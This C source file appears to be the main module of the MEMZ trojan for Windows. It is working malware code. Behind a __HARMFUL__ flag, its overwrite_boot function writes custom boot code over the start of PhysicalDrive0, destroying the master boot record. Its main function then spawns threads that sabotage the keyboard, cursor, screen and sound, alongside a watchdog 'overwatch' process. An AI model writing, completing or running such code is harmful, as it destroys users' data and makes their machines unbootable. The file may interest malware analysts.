#include <memz/payload.h>
#include <memz/payload_function.h>
#include <memz/overwatch.h>
#include <memz/data.h>

#include <Windows.h>
#include <string.h>


void notepad_alert()
{
    HANDLE handle_note = CreateFileA("\\note.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

    if (handle_note == INVALID_HANDLE_VALUE)
        ExitProcess(4);

    DWORD wb;
    if (!WriteFile(handle_note, note, note_size, &wb, NULL))
        ExitProcess(5);

    CloseHandle(handle_note);
    ShellExecuteA(NULL, NULL, "notepad", "\\note.txt", NULL, SW_SHOWDEFAULT);
}

#ifdef __HARMFUL__
void overwrite_boot() // DANGER
{
    HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

    if (drive == INVALID_HANDLE_VALUE)
        ExitProcess(2);

    unsigned char *bootcode = (unsigned char *)LocalAlloc(LMEM_ZEROINIT, 65536);

    // Join the two code parts together
    int i = 0;
    for (; i < code1_size; i++)
        *(bootcode + i) = *(code1 + i);
    for (i = 0; i < code2_size; i++)
        *(bootcode + i + 0x1fe) = *(code2 + i);

    DWORD wb;
    if (!WriteFile(drive, bootcode, 65536, &wb, NULL))
        ExitProcess(3);

    CloseHandle(drive);
}
#endif

int main(int argc, char* argv[])
{
    if (argc == 1)
        start_overwatch();

    else if (!strcmp(argv[1], "-overwatch"))
        overwatch();

    else if (!strcmp(argv[1], "-payload"))
    {
#ifdef __HARMFUL__
        overwrite_boot(); // DANGER
#endif
        notepad_alert();
        payload_t payloads[] =
        {
            { shell_execute, 10, 10, 10000, 0, 0 },
            { keyboard_malfunction, 45, 0, 10000, 1000, 200 },
            { cursor_malfunction, 110, 0, 100, 0, 0 },
            { invert_colors, 20, 0, 1000, 1000, 100 },
            { invert_text, 30, 0, 2000, 0, 0 },
            { play_sound, 15, 0, 5000, 100, 100 },
            { message_boxes, 25, 0, 15000, 500, 500 },
            { draw_icons, 60, 0, 1000, 50, 10 },
            { tunnel_vision, 120, 0, 5000, 100, 100 },
            { screen_glitches, 80, 0, 5000, 100, 100 },
            { buzzer, 120, 0, 0, 0, 0  },
        };

        const size_t payloads_size = sizeof(payloads) / sizeof(payload_t);
        
        for (size_t i = 0; i < payloads_size; ++i)
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload_host, &payloads[i], 0, 0);

        for (;;)
            Sleep(10000);
    }

    return 0;
}